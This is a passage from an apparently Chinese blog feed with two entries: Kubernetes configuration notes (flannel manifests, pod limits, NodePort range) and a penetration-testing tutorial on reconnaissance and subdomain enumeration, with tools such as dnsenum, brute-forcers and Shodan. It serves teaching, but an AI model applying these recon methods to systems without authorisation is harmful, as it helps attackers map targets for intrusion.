class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&#x27;extensions&#x27;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&#x27;podsecuritypolicies&#x27;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&#x27;use&#x27;</span>]</span><br><span class="line">  <span class="attr">resourceNames:</span> [<span class="string">&#x27;psp.flannel.unprivileged&#x27;</span>]</span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">pods</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">get</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">nodes</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">list</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">watch</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">nodes/status</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">patch</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">flannel</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">flannel</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">flannel</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">flannel</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ConfigMap</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-flannel-cfg</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">tier:</span> <span class="string">node</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">flannel</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="attr">cni-conf.json:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;name&quot;: &quot;cbr0&quot;,</span></span><br><span class="line"><span class="string">      &quot;cniVersion&quot;: &quot;0.3.1&quot;,</span></span><br><span class="line"><span class="string">      &quot;plugins&quot;: [</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">          &quot;type&quot;: &quot;flannel&quot;,</span></span><br><span class="line"><span class="string">          &quot;delegate&quot;: &#123;</span></span><br><span class="line"><span class="string">            &quot;hairpinMode&quot;: true,</span></span><br><span class="line"><span class="string">            &quot;isDefaultGateway&quot;: true</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">          &quot;type&quot;: &quot;portmap&quot;,</span></span><br><span class="line"><span class="string">          &quot;capabilities&quot;: &#123;</span></span><br><span class="line"><span class="string">            &quot;portMappings&quot;: true</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      ]</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span>  <span class="attr">net-conf.json:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;Network&quot;: &quot;10.244.0.0/16&quot;,</span></span><br><span class="line"><span class="string">      &quot;Backend&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;Type&quot;: &quot;vxlan&quot;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">DaemonSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-flannel-ds</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">tier:</span> <span class="string">node</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">flannel</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">flannel</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">tier:</span> <span class="string">node</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">flannel</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">affinity:</span></span><br><span class="line">        <span class="attr">nodeAffinity:</span></span><br><span class="line">          <span class="attr">requiredDuringSchedulingIgnoredDuringExecution:</span></span><br><span class="line">            <span class="attr">nodeSelectorTerms:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">matchExpressions:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">kubernetes.io/os</span></span><br><span class="line">                <span class="attr">operator:</span> <span class="string">In</span></span><br><span class="line">                <span class="attr">values:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">linux</span></span><br><span class="line">      <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">priorityClassName:</span> <span class="string">system-node-critical</span></span><br><span class="line">      <span class="attr">tolerations:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">operator:</span> <span class="string">Exists</span></span><br><span class="line">        <span class="attr">effect:</span> <span class="string">NoSchedule</span></span><br><span class="line">      <span class="attr">serviceAccountName:</span> <span class="string">flannel</span></span><br><span class="line">      <span class="attr">initContainers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install-cni</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">quay.io/coreos/flannel:v0.14.0</span></span><br><span class="line">        <span class="attr">command:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">cp</span></span><br><span class="line">        <span class="attr">args:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">-f</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/etc/kube-flannel/cni-conf.json</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/etc/cni/net.d/10-flannel.conflist</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">cni</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/etc/cni/net.d</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">flannel-cfg</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/etc/kube-flannel/</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">kube-flannel</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">quay.io/coreos/flannel:v0.14.0</span></span><br><span class="line">        <span class="attr">command:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/opt/bin/flanneld</span></span><br><span class="line">        <span class="attr">args:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">--ip-masq</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">--kube-subnet-mgr</span></span><br><span class="line">        <span class="attr">resources:</span></span><br><span class="line">          <span class="attr">requests:</span></span><br><span class="line">            <span class="attr">cpu:</span> <span class="string">&quot;100m&quot;</span></span><br><span class="line">            <span class="attr">memory:</span> <span class="string">&quot;50Mi&quot;</span></span><br><span class="line">          <span class="attr">limits:</span></span><br><span class="line">            <span class="attr">cpu:</span> <span class="string">&quot;100m&quot;</span></span><br><span class="line">            <span class="attr">memory:</span> <span class="string">&quot;50Mi&quot;</span></span><br><span class="line">        <span class="attr">securityContext:</span></span><br><span class="line">          <span class="attr">privileged:</span> <span class="literal">false</span></span><br><span class="line">          <span class="attr">capabilities:</span></span><br><span class="line">            <span class="attr">add:</span> [<span class="string">&quot;NET_ADMIN&quot;</span>, <span class="string">&quot;NET_RAW&quot;</span>]</span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">POD_NAME</span></span><br><span class="line">          <span class="attr">valueFrom:</span></span><br><span class="line">            <span class="attr">fieldRef:</span></span><br><span class="line">              <span class="attr">fieldPath:</span> <span class="string">metadata.name</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">POD_NAMESPACE</span></span><br><span class="line">          <span class="attr">valueFrom:</span></span><br><span class="line">            <span class="attr">fieldRef:</span></span><br><span class="line">              <span class="attr">fieldPath:</span> <span class="string">metadata.namespace</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">run</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/run/flannel</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">flannel-cfg</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/etc/kube-flannel/</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">run</span></span><br><span class="line">        <span class="attr">hostPath:</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">/run/flannel</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">cni</span></span><br><span class="line">        <span class="attr">hostPath:</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">/etc/cni/net.d</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">flannel-cfg</span></span><br><span class="line">        <span class="attr">configMap:</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">kube-flannel-cfg</span></span><br></pre></td></tr></table></figure>

<h2 id="六-修改Pod数量限制"><a href="#六-修改Pod数量限制" class="headerlink" title="六.修改Pod数量限制"></a>六.修改Pod数量限制</h2><p><strong>题目要求</strong></p>
<p><strong>Kubernetes 默认每个节点只能启动 110 个 Pod，由于业务需要，将每个节点默认限制的Pod 数量改为 200。</strong></p>
<h3 id="1-方法一"><a href="#1-方法一" class="headerlink" title="1.方法一"></a>1.方法一</h3><h4 id="①在Node上-设置打开文件-var-lib-kubelet-config-yaml"><a href="#①在Node上-设置打开文件-var-lib-kubelet-config-yaml" class="headerlink" title="①在Node上 设置打开文件&#x2F;var&#x2F;lib&#x2F;kubelet&#x2F;config.yaml"></a>①在Node上 设置打开文件&#x2F;var&#x2F;lib&#x2F;kubelet&#x2F;config.yaml</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">vi</span>  <span class="string">/var/lib/kubelet/config.yaml</span></span><br></pre></td></tr></table></figure>

<h4 id="②修改参数maxPods为指定的值："><a href="#②修改参数maxPods为指定的值：" class="headerlink" title="②修改参数maxPods为指定的值："></a>②修改参数maxPods为指定的值：</h4><p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220711105058835.png" alt="image-20220711105058835"></p>
<h4 id="③重启kubelet"><a href="#③重启kubelet" class="headerlink" title="③重启kubelet"></a>③重启kubelet</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart kubelet</span><br></pre></td></tr></table></figure>

<h4 id="④查看Pod数量"><a href="#④查看Pod数量" class="headerlink" title="④查看Pod数量"></a>④查看Pod数量</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl describe node   |  grep -i &quot;Capacity\|Allocatable&quot; -A 6</span><br></pre></td></tr></table></figure>

<h3 id="2-方法二"><a href="#2-方法二" class="headerlink" title="2.方法二"></a>2.方法二</h3><h4 id="①编辑kubelet环境配置文件，添加参数"><a href="#①编辑kubelet环境配置文件，添加参数" class="headerlink" title="①编辑kubelet环境配置文件，添加参数"></a>①编辑kubelet环境配置文件，添加参数</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/sysconfig/kubelet</span><br><span class="line"></span><br><span class="line">KUBELET_EXTRA_ARGS=&quot;--max-pods=200&quot;</span><br></pre></td></tr></table></figure>

<h4 id="②编辑kubelet服务文件，写入环境文件路径"><a href="#②编辑kubelet服务文件，写入环境文件路径" class="headerlink" title="②编辑kubelet服务文件，写入环境文件路径"></a>②编辑kubelet服务文件，写入环境文件路径</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /usr/lib/systemd/system/kubelet.service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line"></span><br><span class="line">Environment=-/etc/sysconfig/kubele</span><br></pre></td></tr></table></figure>

<h4 id="②重启kubelet"><a href="#②重启kubelet" class="headerlink" title="②重启kubelet"></a>②重启kubelet</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line">systemctl restart kubelet</span><br></pre></td></tr></table></figure>

<h3 id="七-修改-NodePort-端口范围"><a href="#七-修改-NodePort-端口范围" class="headerlink" title="七.修改 NodePort 端口范围"></a>七.修改 NodePort 端口范围</h3><h3 id="1-修改kube-apiserver-yaml-文件"><a href="#1-修改kube-apiserver-yaml-文件" class="headerlink" title="1.修改kube-apiserver.yaml 文件"></a>1.修改kube-apiserver.yaml 文件</h3><p><strong>使用 kubeadm 安装 K8S 集群的情况下，您的 Master 节点上会有一个文件</strong><br> <strong>&#x2F;etc&#x2F;kubernetes&#x2F;manifests&#x2F;kube-apiserver.yaml，修改此文件，</strong><br><strong>向command添加 –service-node-port-range&#x3D;20000-65535 （请使用您自己需要的端口范围），如下所示：</strong></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">vi</span> <span class="string">/etc/kubernetes/manifests/kube-apiserver.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">component:</span> <span class="string">kube-apiserver</span></span><br><span class="line">    <span class="attr">tier:</span> <span class="string">control-plane</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-apiserver</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">command:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">kube-apiserver</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--advertise-address=172.17.216.80</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--allow-privileged=true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--authorization-mode=Node,RBAC</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--client-ca-file=/etc/kubernetes/pki/ca.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--enable-admission-plugins=NodeRestriction</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--enable-bootstrap-token-auth=true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-servers=https://127.0.0.1:2379</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--insecure-port=0</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-allowed-names=front-proxy-client</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-extra-headers-prefix=X-Remote-Extra-</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-group-headers=X-Remote-Group</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-username-headers=X-Remote-User</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--secure-port=6443</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--service-account-key-file=/etc/kubernetes/pki/sa.pub</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--service-cluster-ip-range=10.96.0.0/12</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--service-node-port-range=20000-22767</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--tls-cert-file=/etc/kubernetes/pki/apiserver.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--tls-private-key-file=/etc/kubernetes/pki/apiserver.key</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver:v1.16.0</span></span><br><span class="line">    <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">    <span class="attr">livenessProbe:</span></span><br><span class="line">      <span class="attr">failureThreshold:</span> <span class="number">8</span></span><br><span class="line">      <span class="attr">httpGet:</span></span><br><span class="line">        <span class="attr">host:</span> <span class="number">172.17</span><span class="number">.216</span><span class="number">.80</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/healthz</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">6443</span></span><br><span class="line">        <span class="attr">scheme:</span> <span class="string">HTTPS</span></span><br><span class="line">      <span class="attr">initialDelaySeconds:</span> <span class="number">15</span></span><br><span class="line">      <span class="attr">timeoutSeconds:</span> <span class="number">15</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2.重启APIServer</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获得 apiserver 的 pod 名字</span></span><br><span class="line">export apiserver_pods=$(kubectl get pods --selector=component=kube-apiserver -n kube-system --output=jsonpath=&#123;.items..metadata.name&#125;)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除 apiserver 的 pod</span></span><br><span class="line">kubectl delete pod $apiserver_pods -n kube-system</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3.验证成果</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl describe pod $apiserver_pods -n kube-system</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>云计算</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>老男孩--信息收集(1)</title>
    <url>/posts/3b40f62a.html</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ol>
<li>本文章由GeekY编写，仅供学习和研究使用,请勿使用项目的技术手段用于非法用途,任何人造成的任何负面影响,与本人无关。</li>
<li>本文档所有内容、新闻皆不代表本人态度、立场</li>
<li>不会收取任何广告费用,展示的所有工具链接与本人无任何利害关系</li>
</ol>
<h2 id="理论部分"><a href="#理论部分" class="headerlink" title="理论部分"></a>理论部分</h2><h3 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h3><p>1.明确目标</p>
<p>​	确定范围：渗透测试的目标范围、IP、域名、内外网</p>
<p>​	确定规则：可以渗透到什么程度、时间有什么要求？是否可以修改上传（木马是否允许上传）？能否提权等</p>
<p>​	确定需求：web应用的漏洞（新上线的程序）？业务逻辑漏洞（针对业务的）？</p>
<p>​		通知客户数据库备份、源代码备份</p>
<p>​		禁止登陆扫描</p>
<p>​		降低扫描线程</p>
<p>​		增删改一定要手工进行</p>
<p>​		禁止脱裤、跑数据、传shell、发起DOS、DDOS攻击</p>
<p>2.信息收集</p>
<p>​	收集方式：主动扫描、开放搜索（利用搜索引擎获得后台、未授权页面、敏感URL等）</p>
<p>​	基础信息：IP，网段，域名，端口</p>
<p>​	系统信息：操作系统版本</p>
<p>​	应用信息：各端口的应用，如web应用、邮件应用、DNS服务等</p>
<p>​	版本信息：所有这些探测到的版本</p>
<p>​	人员信息：域名注册人员信息，web应用中网站发帖人ID，管理员姓名等</p>
<p>​	防护信息：是否能测试到防护设备</p>
<p>3.漏洞探测</p>
<p>​	漏扫：AWVS、IBM appscan</p>
<p>​	系统漏洞：未及时打补丁</p>
<p>​	web漏洞：web应用开发问题</p>
<p>​	结合漏洞寻找poc</p>
<p>4.漏洞验证（需要确认）</p>
<p>​	将上述所有漏洞全部验证一遍</p>
<p>​	自动化验证：结合自动化工具进行验证</p>
<p>​	手工验证：SQL注入，XSS测试</p>
<p>​	登录猜解：弱密码</p>
<p>5.信息分析</p>
<p>​	用漏洞实行精准打击</p>
<p>​	定制攻击路径、绕过检测机制、攻击代码</p>
<p>6.获取所需</p>
<p>​	获取内部信息：基础设施（网络连接、vpn、路由、拓扑）</p>
<p>​	进一步渗透：内网入侵，敏感目标</p>
<p>​	清理痕迹：清理相关日志和木马、上传文件等</p>
<p>7.信息整理</p>
<p>​	整理渗透工具：用的代码，poc，exp等</p>
<p>​	整理收集信息：整理收集到的信息</p>
<p>​	整理漏洞信息：整理渗透过程中的漏洞</p>
<p>8.形成报告</p>
<p>​	漏洞成因，验证过程，带来的危害分析、修补建议</p>
<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="二级域名-二级域名、C端、旁站、"><a href="#二级域名-二级域名、C端、旁站、" class="headerlink" title="二级域名 二级域名、C端、旁站、"></a>二级域名 二级域名、C端、旁站、</h4><h5 id="二级域名"><a href="#二级域名" class="headerlink" title="二级域名"></a>二级域名</h5><p><strong>收集子域名方法一： DNS域传送漏洞</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过kail 的dnsenum工具获取dns域中域名</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kali&gt; </span><span class="language-bash">dnsenum 【域名】</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意收集的域名信息包含CDN的IP地址，需要进行过滤</span></span><br><span class="line">CDN：简单理解为WEB网站的缓存服务器，分布在不同节点实现网站的快速访问</span><br></pre></td></tr></table></figure>

<p><strong>收集子域名方法二：备案号查询</strong></p>
<p><img src="/img/oldboy/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250216140219.png"></p>
<p>查询网址：</p>
<p>​	<a href="http://icp.bugscaner.com/">ICP网站域名备案查询网</a></p>
<p>​	<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p>
<p>​	<a href="https://icp.aizhan.com/">icp备案查询_网站备案查询_域名备案查询_APP备案查询_小程序备案查询_快应用备案查询_爱站网</a></p>
<p>​	<a href="http://cha.fute.com/index">http://cha.fute.com/index</a></p>
<p>​	<a href="https://0.zone/">零零信安 | ASM | 攻击面 | 外部攻击面管理专家 | 比攻击者更快一步了解您自己的风险</a></p>
<blockquote>
<p>注意：备案号一般存放在门户网站的最底部</p>
</blockquote>
<p><strong>收集子域名方法三：SSL证书</strong></p>
<p>SSL证书查找方法：</p>
<p><img src="/img/oldboy/1-2.png"></p>
<p><img src="/img/oldboy/1-3.png"></p>
<p><img src="/img/oldboy/1-4.png"></p>
<p>寻找方法：</p>
<p>​	①找到渗透门户网站，点击锁图标查看https的证书信息</p>
<p>​	②点击右上角证书图标，找到证书字段中的序列号</p>
<p>​	③需要将改字段值转换为十进制，通过Burp Suit软件、在线转换工具直接转换即可</p>
<p>查询网站：</p>
<p>​	<a href="https://myssl.com/ssl.html">SSL状态检测</a></p>
<p>​	<a href="https://www.chinassl.net/ssltools/ssl-checker.html">SSL证书在线检测工具-中国数字证书CHINASSL</a></p>
<p><strong>收集子域名方法四：利用反编译工具收集域名信息</strong></p>
<p>​	通过AndroidKiller反编译器，里面可以查找相关的公司域名和ip地址信息</p>
<p><strong>收集子域名方法五：微信公众号提取</strong></p>
<p>​	通过开启手机代理，实现BurpSuit与手机的联动，抓包分析</p>
<p>​	搜狗：<a href="https://weixin.sogou.com/">https://weixin.sogou.com</a></p>
<p><strong>收集子域名方法六：暴力破解</strong></p>
<p>​	即利用枚举法通过字典的形式，进行暴力破解，获取二级域名</p>
<p>查询网站：</p>
<p>​	<a href="https://scan.javasec.cn/">在线子域名爆破-JAVASEC</a></p>
<p>​	<a href="https://rapiddns.io/subdomain">Subdomain - RapidDNS Rapid DNS Information Collection</a></p>
<p>​	<a href="https://chaziyu.com/">子域名查询 查子域名 查子站 子域名大全 二级域名查询 查子域</a></p>
<p>​	<a href="https://www.dnsgrep.cn/subdomain">子域名查询 - dnsgrep</a></p>
<p>​	<a href="https://dnsdumpster.com/">DNSDumpster - Find &amp; lookup dns records for recon &amp; research</a></p>
<p>​	</p>
<p>工具：</p>
<ul>
<li>OneForAll：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li>
<li>ksudbomain：<a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a></li>
<li>subDomainsBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li>
<li>Sublist3r:  <a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li>
<li>子域名挖掘机：<a href="https://github.com/euphrat1ca/LayerDomainFinder">https://github.com/euphrat1ca/LayerDomainFinder</a></li>
<li>dirsearch：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></li>
</ul>
<p><strong>收集子域名方法七：利用域名信息历史注册记录</strong></p>
<p>查询网站：</p>
<p>​	<a href="https://whois.chinaz.com/">域名Whois查询 - 站长工具</a></p>
<p>​	<a href="https://www.godaddy.com/zh-sg/offers/whois-b?isc=sem3year&countryview=1&currencyType=CNY&cdtl=c_20419696261.g_150582122103.k_kwd-10506105019.a_710479444795.d_c.ctv_g&bnb=nb&gad_source=1&gclid=EAIaIQobChMIwoj3uMbHiwMVz9oWBR2NACzqEAAYASAAEgLThPD_BwE">WHOIS 域名查询 - 查找网站所有者 - GoDaddy CN</a></p>
<p>​	<a href="https://zh.whois-history.whoisxmlapi.com/lookup">通过WHOIS历史信息查询访问域名历史 | WhoisXML API</a></p>
<p><strong>收集子域名方法八：利用域名信息历史注册记录</strong></p>
<p>1）百度 谷歌</p>
<p>​	site:oldboyedu.com  –根据主域信息进行检索</p>
<p>​	intitle：老男孩教育   –根据企业名称进行检索</p>
<p>2） <strong>空间搜索引擎</strong></p>
<ul>
<li><p>FOFA: <a href="https://fofa.info/">https://fofa.info</a></p>
</li>
<li><p>Quake：<a href="https://quake.360.cn/quake/#/index">https://quake.360.cn/quake/#/index</a></p>
</li>
<li><p>Shadon：<a href="https://www.shodan.io/">https://www.shodan.io</a></p>
<ul>
<li>基础语法：<a href="https://blog.csdn.net/Vdieoo/article/details/109622838">https://blog.csdn.net/Vdieoo/article/details/109622838</a></li>
</ul>
